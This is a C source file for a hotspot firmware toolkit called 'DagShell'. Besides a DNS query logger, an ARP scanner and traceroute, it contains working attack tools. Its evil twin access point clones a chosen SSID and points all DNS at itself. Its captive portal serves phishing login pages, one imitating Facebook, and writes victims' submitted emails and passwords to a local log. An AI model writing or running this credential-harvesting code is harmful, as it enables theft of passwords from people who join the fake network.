/*
 * nettools.c - Network Tools for DagShell Orbic Firmware
 * DNS Sniffer, ARP Scanner, Traceroute, Evil Twin AP, Captive Portal
 * No promiscuous mode or Bluetooth required
 */

#include "nettools.h"
#include "log.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

// ============================================================================
// DNS SNIFFER - Uses iptables LOG to capture DNS queries
// ============================================================================

#define DNS_LOG_FILE "/tmp/dns_queries.log"
static int dns_sniffer_running = 0;

void nettools_dns_start() {
  if (dns_sniffer_running)
    return;

  // Clear old log
  unlink(DNS_LOG_FILE);

  // Add iptables rule to log DNS queries (port 53)
  // LOG prefix allows us to grep from dmesg
  system("iptables -I FORWARD -p udp --dport 53 -j LOG --log-prefix 'DNS:' "
         "--log-level 4 2>/dev/null");
  system("iptables -I FORWARD -p tcp --dport 53 -j LOG --log-prefix 'DNS:' "
         "--log-level 4 2>/dev/null");

  // Start background process to parse dmesg and extract DNS
  system("( while true; do dmesg -c 2>/dev/null | grep 'DNS:' >> " DNS_LOG_FILE
         "; sleep 2; done ) &");
  system("echo $! > /tmp/dns_sniffer.pid");

  dns_sniffer_running = 1;
  daglog("DNS sniffer started");
}

void nettools_dns_stop() {
  if (!dns_sniffer_running)
    return;

  // Remove iptables rules
  system("iptables -D FORWARD -p udp --dport 53 -j LOG --log-prefix 'DNS:' "
         "--log-level 4 2>/dev/null");
  system("iptables -D FORWARD -p tcp --dport 53 -j LOG --log-prefix 'DNS:' "
         "--log-level 4 2>/dev/null");

  // Kill background parser
  system("kill $(cat /tmp/dns_sniffer.pid 2>/dev/null) 2>/dev/null");
  unlink("/tmp/dns_sniffer.pid");

  dns_sniffer_running = 0;
  daglog("DNS sniffer stopped");
}

int nettools_dns_is_running() {
  // Check if PID file exists and process running
  if (access("/tmp/dns_sniffer.pid", F_OK) == 0) {
    FILE *fp = fopen("/tmp/dns_sniffer.pid", "r");
    if (fp) {
      char pid[16] = {0};
      if (fgets(pid, sizeof(pid), fp)) {
        char proc_path[32];
        snprintf(proc_path, sizeof(proc_path), "/proc/%s", pid);
        proc_path[strcspn(proc_path, "\n")] = 0;
        fclose(fp);
        if (access(proc_path, F_OK) == 0) {
          dns_sniffer_running = 1;
          return 1;
        }
      }
      fclose(fp);
    }
  }
  dns_sniffer_running = 0;
  return 0;
}

int nettools_dns_get_log(char *buffer, int max_len) {
  // Read last 50 lines from log (parsed for client IP and domain)
  FILE *fp = popen("tail -50 " DNS_LOG_FILE " 2>/dev/null", "r");
  if (!fp) {
    snprintf(buffer, max_len, "[]");
    return 0;
  }

  int offset = snprintf(buffer, max_len, "[");
  char line[512];
  int count = 0;

  while (fgets(line, sizeof(line), fp) && offset < max_len - 100) {
    // Parse: ... SRC=192.168.1.x DST=... DPT=53 ...
    char *src = strstr(line, "SRC=");
    char *dst = strstr(line, "DST=");

    if (src && dst) {
      char src_ip[32] = {0}, dst_ip[32] = {0};
      sscanf(src + 4, "%31s", src_ip);
      sscanf(dst + 4, "%31s", dst_ip);

      // Remove trailing space
      src_ip[strcspn(src_ip, " ")] = 0;
      dst_ip[strcspn(dst_ip, " ")] = 0;

      if (count > 0)
        offset += snprintf(buffer + offset, max_len - offset, ",");
      offset += snprintf(buffer + offset, max_len - offset,
                         "{\"src\":\"%s\",\"dst\":\"%s\"}", src_ip, dst_ip);
      count++;
    }
  }
  pclose(fp);

  snprintf(buffer + offset, max_len - offset, "]");
  return count;
}

// ============================================================================
// ARP SCANNER - Discover devices on local network
// ============================================================================

// Common OUI prefixes for vendor lookup (top 20)
static const char *oui_lookup(const char *mac) {
  // First 8 chars of MAC (XX:XX:XX format)
  if (strncasecmp(mac, "00:00:5E", 8) == 0)
    return "IANA";
  if (strncasecmp(mac, "00:1A:2B", 8) == 0)
    return "Ayecom";
  if (strncasecmp(mac, "00:50:56", 8) == 0)
    return "VMware";
  if (strncasecmp(mac, "08:00:27", 8) == 0)
    return "VirtualBox";
  if (strncasecmp(mac, "B8:27:EB", 8) == 0)
    return "Raspberry Pi";
  if (strncasecmp(mac, "DC:A6:32", 8) == 0)
    return "Raspberry Pi";
  if (strncasecmp(mac, "00:1C:B3", 8) == 0)
    return "Apple";
  if (strncasecmp(mac, "F0:18:98", 8) == 0)
    return "Apple";
  if (strncasecmp(mac, "3C:22:FB", 8) == 0)
    return "Apple";
  if (strncasecmp(mac, "AC:DE:48", 8) == 0)
    return "Apple";
  if (strncasecmp(mac, "00:17:88", 8) == 0)
    return "Philips";
  if (strncasecmp(mac, "18:B4:30", 8) == 0)
    return "Nest";
  if (strncasecmp(mac, "44:65:0D", 8) == 0)
    return "Amazon";
  if (strncasecmp(mac, "FC:65:DE", 8) == 0)
    return "Amazon";
  if (strncasecmp(mac, "00:1A:22", 8) == 0)
    return "Samsung";
  if (strncasecmp(mac, "CC:2D:83", 8) == 0)
    return "Samsung";
  if (strncasecmp(mac, "30:AE:A4", 8) == 0)
    return "Espressif";
  if (strncasecmp(mac, "24:6F:28", 8) == 0)
    return "Espressif";
  if (strncasecmp(mac, "A4:CF:12", 8) == 0)
    return "Espressif";
  if (strncasecmp(mac, "80:7D:3A", 8) == 0)
    return "Espressif";
  if (strncasecmp(mac, "C8:2B:96", 8) == 0)
    return "Espressif";
  if (strncasecmp(mac, "00:15:5D", 8) == 0)
    return "Hyper-V";
  if (strncasecmp(mac, "00:0C:29", 8) == 0)
    return "VMware";
  if (strncasecmp(mac, "E8:6F:38", 8) == 0)
    return "Xiaomi";
  if (strncasecmp(mac, "14:F6:5A", 8) == 0)
    return "Xiaomi";
  return "Unknown";
}

int nettools_arp_scan(char *json_out, int max_len) {
  // First, ping broadcast to populate ARP table
  system("ping -c 1 -b 192.168.1.255 >/dev/null 2>&1 &");
  usleep(500000); // 500ms wait

  // Read ARP table
  FILE *fp = fopen("/proc/net/arp", "r");
  if (!fp) {
    snprintf(json_out, max_len, "[]");
    return 0;
  }

  int offset = snprintf(json_out, max_len, "[");
  char line[256];
  int count = 0;

  // Skip header
  fgets(line, sizeof(line), fp);

  while (fgets(line, sizeof(line), fp) && offset < max_len - 150) {
    char ip[32], hw_type[8], flags[8], mac[20], mask[8], iface[16];
    if (sscanf(line, "%31s %7s %7s %19s %7s %15s", ip, hw_type, flags, mac,
               mask, iface) >= 4) {
      // Skip incomplete entries
      if (strcmp(mac, "00:00:00:00:00:00") == 0)
        continue;

      const char *vendor = oui_lookup(mac);

      if (count > 0)
        offset += snprintf(json_out + offset, max_len - offset, ",");
      offset += snprintf(
          json_out + offset, max_len - offset,
          "{\"ip\":\"%s\",\"mac\":\"%s\",\"vendor\":\"%s\",\"iface\":\"%s\"}",
          ip, mac, vendor, iface);
      count++;
    }
  }
  fclose(fp);

  snprintf(json_out + offset, max_len - offset, "]");
  return count;
}

// ============================================================================
// TRACEROUTE - Network path visualization
// ============================================================================

int nettools_traceroute(const char *target, char *json_out, int max_len) {
  if (!target || strlen(target) == 0 || strlen(target) > 100) {
    snprintf(json_out, max_len, "{\"error\":\"Invalid target\"}");
    return -1;
  }

  // Sanitize target (allow only alphanumeric, dots, hyphens)
  for (const char *p = target; *p; p++) {
    if (!(*p >= 'a' && *p <= 'z') && !(*p >= 'A' && *p <= 'Z') &&
        !(*p >= '0' && *p <= '9') && *p != '.' && *p != '-') {
      snprintf(json_out, max_len,
               "{\"error\":\"Invalid characters in target\"}");
      return -1;
    }
  }

  char cmd[256];
  snprintf(cmd, sizeof(cmd), "traceroute -n -m 15 -w 2 %s 2>&1", target);

  FILE *fp = popen(cmd, "r");
  if (!fp) {
    snprintf(json_out, max_len, "{\"error\":\"Failed to run traceroute\"}");
    return -1;
  }

  int offset =
      snprintf(json_out, max_len, "{\"target\":\"%s\",\"hops\":[", target);
  char line[256];
  int hop_count = 0;

  // Skip first line (header)
  fgets(line, sizeof(line), fp);

  while (fgets(line, sizeof(line), fp) && offset < max_len - 100) {
    int hop;
    char ip[32] = "*";
    float rtt1 = 0, rtt2 = 0, rtt3 = 0;

    // Parse: "1  192.168.1.1  1.234 ms  1.456 ms  1.789 ms"
    if (sscanf(line, "%d %31s %f ms", &hop, ip, &rtt1) >= 2) {
      if (hop_count > 0)
        offset += snprintf(json_out + offset, max_len - offset, ",");
      offset +=
          snprintf(json_out + offset, max_len - offset,
                   "{\"hop\":%d,\"ip\":\"%s\",\"rtt\":%.1f}", hop, ip, rtt1);
      hop_count++;
    } else if (sscanf(line, "%d %*s %*s %*s", &hop) == 1) {
      // Timeout line
      if (hop_count > 0)
        offset += snprintf(json_out + offset, max_len - offset, ",");
      offset += snprintf(json_out + offset, max_len - offset,
                         "{\"hop\":%d,\"ip\":\"*\",\"rtt\":0}", hop);
      hop_count++;
    }
  }
  pclose(fp);

  snprintf(json_out + offset, max_len - offset, "]}");
  return hop_count;
}

// ============================================================================
// EVIL TWIN AP - Clone SSID on wlan1 (without hostapd)
// Uses native Linux AP mode with wpa_supplicant or iw
// ============================================================================

#define EVILTWIN_CONF "/tmp/eviltwin.conf"
#define EVILTWIN_PID "/tmp/eviltwin.pid"

int nettools_eviltwin_start(const char *ssid, const char *password) {
  if (!ssid || strlen(ssid) == 0 || strlen(ssid) > 32) {
    return -1;
  }

  // Stop any existing instance
  nettools_eviltwin_stop();

  // Enable IP forwarding
  system("echo 1 > /proc/sys/net/ipv4/ip_forward");

  // Bring up wlan1 and set IP
  system("ifconfig wlan1 down 2>/dev/null");
  usleep(200000);
  system("ifconfig wlan1 up");
  usleep(500000);
  system("ifconfig wlan1 192.168.2.1 netmask 255.255.255.0");

  // Try hostapd first, fall back to wpa_supplicant AP mode
  FILE *fp = fopen(EVILTWIN_CONF, "w");
  if (!fp)
    return -1;

  // Check if hostapd exists
  int has_hostapd = (system("which hostapd >/dev/null 2>&1") == 0);

  if (has_hostapd) {
    // hostapd config
    fprintf(fp, "interface=wlan1\n");
    fprintf(fp, "driver=nl80211\n");
    fprintf(fp, "ssid=%s\n", ssid);
    fprintf(fp, "hw_mode=g\n");
    fprintf(fp, "channel=6\n");
    fprintf(fp, "wmm_enabled=0\n");
    fprintf(fp, "macaddr_acl=0\n");
    fprintf(fp, "auth_algs=1\n");
    fprintf(fp, "ignore_broadcast_ssid=0\n");
    if (password && strlen(password) >= 8) {
      fprintf(fp, "wpa=2\n");
      fprintf(fp, "wpa_passphrase=%s\n", password);
      fprintf(fp, "wpa_key_mgmt=WPA-PSK\n");
      fprintf(fp, "rsn_pairwise=CCMP\n");
    }
    fclose(fp);
    system("hostapd -B " EVILTWIN_CONF " >/dev/null 2>&1");
    system("pgrep hostapd > " EVILTWIN_PID " 2>/dev/null");
  } else {
    // wpa_supplicant AP mode config
    fprintf(fp, "ctrl_interface=/var/run/wpa_supplicant\n");
    fprintf(fp, "ap_scan=2\n");
    fprintf(fp, "\n");
    fprintf(fp, "network={\n");
    fprintf(fp, "    ssid=\"%s\"\n", ssid);
    fprintf(fp, "    mode=2\n");         // AP mode
    fprintf(fp, "    frequency=2437\n"); // Channel 6
    if (password && strlen(password) >= 8) {
      fprintf(fp, "    key_mgmt=WPA-PSK\n");
      fprintf(fp, "    psk=\"%s\"\n", password);
    } else {
      fprintf(fp, "    key_mgmt=NONE\n");
    }
    fprintf(fp, "}\n");
    fclose(fp);

    // Kill ONLY wpa_supplicant on wlan1 - DO NOT use killall which kills wlan0
    // too!
    system("pkill -f 'wpa_supplicant.*wlan1' 2>/dev/null");
    usleep(300000);

    // Start wpa_supplicant in AP mode on wlan1 ONLY
    system("wpa_supplicant -B -i wlan1 -c " EVILTWIN_CONF
           " -Dnl80211 >/dev/null 2>&1");
    system("pgrep -f 'wpa_supplicant.*wlan1' > " EVILTWIN_PID " 2>/dev/null");
  }

  usleep(1000000); // Wait for AP to start

  // Kill any existing dnsmasq that might conflict on wlan1
  system("pkill -f 'dnsmasq.*wlan1' 2>/dev/null");
  usleep(200000);

  // Start DHCP server for Evil Twin clients
  // Use minimal dnsmasq config
  FILE *dns_fp = fopen("/tmp/eviltwin_dnsmasq.conf", "w");
  if (dns_fp) {
    fprintf(dns_fp, "interface=wlan1\n");
    fprintf(dns_fp, "bind-interfaces\n");
    fprintf(dns_fp,
            "dhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,12h\n");
    fprintf(dns_fp, "dhcp-option=3,192.168.2.1\n"); // Gateway
    fprintf(dns_fp, "dhcp-option=6,192.168.2.1\n"); // DNS
    fprintf(dns_fp, "address=/#/192.168.2.1\n");    // Redirect all DNS to us
    fprintf(dns_fp, "no-resolv\n");
    fprintf(dns_fp, "log-queries\n");
    fprintf(dns_fp, "log-dhcp\n");
    fclose(dns_fp);
  }

  system("dnsmasq -C /tmp/eviltwin_dnsmasq.conf "
         "--pid-file=/tmp/eviltwin_dnsmasq.pid 2>/dev/null");

  // NAT for internet access through cellular (optional)
  system("iptables -t nat -A POSTROUTING -o rmnet_data0 -j MASQUERADE "
         "2>/dev/null");
  system("iptables -t nat -A POSTROUTING -o bridge0 -j MASQUERADE 2>/dev/null");

  daglog("Evil Twin AP started");
  return 0;
}

void nettools_eviltwin_stop() {
  // Kill hostapd or wpa_supplicant
  system("pkill hostapd 2>/dev/null");
  system("pkill -f 'wpa_supplicant.*wlan1' 2>/dev/null");
  unlink(EVILTWIN_PID);

  // Kill dnsmasq for evil twin
  system("kill $(cat /tmp/eviltwin_dnsmasq.pid 2>/dev/null) 2>/dev/null");
  system("pkill -f 'dnsmasq.*wlan1' 2>/dev/null");
  unlink("/tmp/eviltwin_dnsmasq.pid");

  // Remove NAT rules
  system("iptables -t nat -D POSTROUTING -o rmnet_data0 -j MASQUERADE "
         "2>/dev/null");
  system("iptables -t nat -D POSTROUTING -o bridge0 -j MASQUERADE 2>/dev/null");

  // Bring down interface
  system("ifconfig wlan1 0.0.0.0 2>/dev/null");

  unlink(EVILTWIN_CONF);
  unlink("/tmp/eviltwin_dnsmasq.conf");

  daglog("Evil Twin AP stopped");
}

int nettools_eviltwin_is_running() {
  // Check for hostapd or wpa_supplicant AP process
  FILE *fp = popen(
      "pgrep -f 'hostapd|wpa_supplicant.*wlan1' 2>/dev/null | head -1", "r");
  if (fp) {
    char pid[16] = {0};
    if (fgets(pid, sizeof(pid), fp)) {
      pclose(fp);
      if (strlen(pid) > 0)
        return 1;
    }
    pclose(fp);
  }
  return 0;
}

// ============================================================================
// CAPTIVE PORTAL - Embedded HTTP server (like main DagShell server)
// Spawned as separate process via system() on port 80
// ============================================================================

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define CAPTIVE_LOG "/data/captive_log.txt"
#define CAPTIVE_PID "/tmp/captive.pid"
#define CAPTIVE_PORT 80

// HTML templates for different portals
static const char *captive_tpl_wifi =
    "<!DOCTYPE html><html><head><meta name='viewport' "
    "content='width=device-width,initial-scale=1'>"
    "<title>WiFi Login</title><style>"
    "body{font-family:Arial;background:#1a1a2e;color:#fff;display:flex;justify-"
    "content:center;align-items:center;height:100vh;margin:0;}"
    ".box{background:#16213e;padding:30px;border-radius:10px;width:300px;text-"
    "align:center;}"
    "input{width:100%;padding:12px;margin:10px "
    "0;border:none;border-radius:5px;box-sizing:border-box;}"
    "button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;"
    "border-radius:5px;cursor:pointer;font-size:16px;}"
    "h2{color:#fff;}</style></head><body>"
    "<div class='box'><h2>Free WiFi</h2><p>Enter your credentials to "
    "connect</p>"
    "<form method='POST' action='/login'>"
    "<input name='email' placeholder='Email' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button>Connect</button></form></div></body></html>";

static const char *captive_tpl_social =
    "<!DOCTYPE html><html><head><meta name='viewport' "
    "content='width=device-width,initial-scale=1'>"
    "<title>Login</title><style>"
    "body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#"
    "f0f2f5;display:flex;justify-content:center;align-items:center;height:"
    "100vh;margin:0;}"
    ".box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px "
    "rgba(0,0,0,0.1);width:360px;}"
    "input{width:100%;padding:14px;margin:6px 0;border:1px solid "
    "#ddd;border-radius:6px;box-sizing:border-box;font-size:16px;}"
    "button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;"
    "border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;}"
    ".logo{font-size:40px;color:#1877f2;font-weight:bold;text-align:center;"
    "margin-bottom:20px;}"
    "</style></head><body>"
    "<div class='box'><div class='logo'>facebook</div>"
    "<form method='POST' action='/login'>"
    "<input name='email' placeholder='Email or phone number' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button>Log In</button></form></div></body></html>";

static const char *captive_tpl_success =
    "<!DOCTYPE html><html><head><meta http-equiv='refresh' "
    "content='3;url=http://192.168.2.1'>"
    "<style>body{font-family:Arial;background:#0a0a0a;color:#0f0;display:flex;"
    "justify-content:center;align-items:center;height:100vh;}</style>"
    "</head><body><h1>Connected! Redirecting...</h1></body></html>";

// Store selected template globally for the forked process
static int use_social_template = 0;

// HTTP server child process - runs in forked process
static void captive_http_server() {
  int server_fd, client_fd;
  struct sockaddr_in address;
  int opt = 1;
  socklen_t addrlen = sizeof(address);

  // Create socket
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd < 0)
    exit(1);

  setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

  address.sin_family = AF_INET;
  // ONLY bind to Evil Twin AP interface (192.168.2.1 on wlan1)
  // Do NOT use INADDR_ANY - that would steal port 80 from wlan0!
  address.sin_addr.s_addr = inet_addr("192.168.2.1");
  address.sin_port = htons(CAPTIVE_PORT);

  if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
    close(server_fd);
    exit(1);
  }

  listen(server_fd, 10);

  // Select template
  const char *html_template =
      use_social_template ? captive_tpl_social : captive_tpl_wifi;

  while (1) {
    client_fd = accept(server_fd, (struct sockaddr *)&address, &addrlen);
    if (client_fd < 0)
      continue;

    // Set timeout
    struct timeval tv = {5, 0};
    setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Read request
    char buffer[4096] = {0};
    ssize_t bytes = read(client_fd, buffer, sizeof(buffer) - 1);
    if (bytes <= 0) {
      close(client_fd);
      continue;
    }

    // Parse request
    int is_post = (strncmp(buffer, "POST", 4) == 0);
    int is_login = (strstr(buffer, "/login") != NULL);
    int is_success = (strstr(buffer, "/success") != NULL);

    char response[8192];

    if (is_post && is_login) {
      // Extract POST body (after \r\n\r\n)
      char *body = strstr(buffer, "\r\n\r\n");
      if (body) {
        body += 4;
        // Log credentials
        FILE *log_fp = fopen(CAPTIVE_LOG, "a");
        if (log_fp) {
          time_t now = time(NULL);
          struct tm *t = localtime(&now);
          fprintf(log_fp, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
                  t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour,
                  t->tm_min, t->tm_sec, body);
          fclose(log_fp);
        }
      }
      // Redirect to success
      snprintf(response, sizeof(response),
               "HTTP/1.1 302 Found\r\n"
               "Location: http://192.168.2.1/success\r\n"
               "Content-Length: 0\r\n"
               "Connection: close\r\n\r\n");
    } else if (is_success) {
      // Show success page
      snprintf(response, sizeof(response),
               "HTTP/1.1 200 OK\r\n"
               "Content-Type: text/html\r\n"
               "Content-Length: %zu\r\n"
               "Connection: close\r\n\r\n%s",
               strlen(captive_tpl_success), captive_tpl_success);
    } else {
      // Serve login page (for any request - captive portal detection)
      snprintf(response, sizeof(response),
               "HTTP/1.1 200 OK\r\n"
               "Content-Type: text/html\r\n"
               "Content-Length: %zu\r\n"
               "Connection: close\r\n\r\n%s",
               strlen(html_template), html_template);
    }

    write(client_fd, response, strlen(response));
    close(client_fd);
  }
}

// Entry point for --captive mode (called from main.c)
void nettools_captive_process(const char *template_name) {
  // Set template based on argument
  if (template_name && strcmp(template_name, "social") == 0) {
    use_social_template = 1;
  } else {
    use_social_template = 0;
  }
  // Run the HTTP server (blocks forever)
  captive_http_server();
}

int nettools_captive_start(const char *template_name) {
  // Stop any existing instance
  nettools_captive_stop();

  // Use system() to spawn orbic_app in captive portal mode (like wardrive)
  // Pass template as argument
  char cmd[256];
  if (template_name && strcmp(template_name, "social") == 0) {
    snprintf(cmd, sizeof(cmd),
             "/data/orbic_app --captive social > /dev/null 2>&1 &");
  } else {
    snprintf(cmd, sizeof(cmd),
             "/data/orbic_app --captive wifi > /dev/null 2>&1 &");
  }
  system(cmd);

  // Give it a moment to start, then record PID
  usleep(500000);
  system("pgrep -f 'orbic_app --captive' | head -1 > " CAPTIVE_PID
         " 2>/dev/null");

  // Set up iptables to redirect HTTP traffic to captive portal
  system("iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT "
         "--to-port 80 2>/dev/null");
  system("iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j "
         "REDIRECT --to-port 80 2>/dev/null");

  daglog("Captive portal started");
  return 0;
}

void nettools_captive_stop() {
  // Kill captive portal process
  system("pkill -f 'orbic_app --captive' 2>/dev/null");
  unlink(CAPTIVE_PID);

  // Remove iptables rules
  system("iptables -t nat -D PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT "
         "--to-port 80 2>/dev/null");
  system("iptables -t nat -D PREROUTING -i wlan1 -p tcp --dport 443 -j "
         "REDIRECT --to-port 80 2>/dev/null");

  daglog("Captive portal stopped");
}

int nettools_captive_is_running() {
  // Check if captive portal process is running
  FILE *fp = popen("pgrep -f 'orbic_app --captive' 2>/dev/null | head -1", "r");
  if (fp) {
    char pid[16] = {0};
    if (fgets(pid, sizeof(pid), fp)) {
      pclose(fp);
      if (strlen(pid) > 0)
        return 1;
    }
    pclose(fp);
  }
  return 0;
}

int nettools_captive_get_log(char *buffer, int max_len) {
  FILE *fp = fopen(CAPTIVE_LOG, "r");
  if (!fp) {
    snprintf(buffer, max_len, "No captures yet.");
    return 0;
  }

  size_t total = 0;
  char line[256];
  buffer[0] = '\0';

  while (fgets(line, sizeof(line), fp) && total < (size_t)(max_len - 256)) {
    strcpy(buffer + total, line);
    total += strlen(line);
  }
  fclose(fp);

  if (total == 0) {
    snprintf(buffer, max_len, "No captures yet.");
  }
  return (int)total;
}
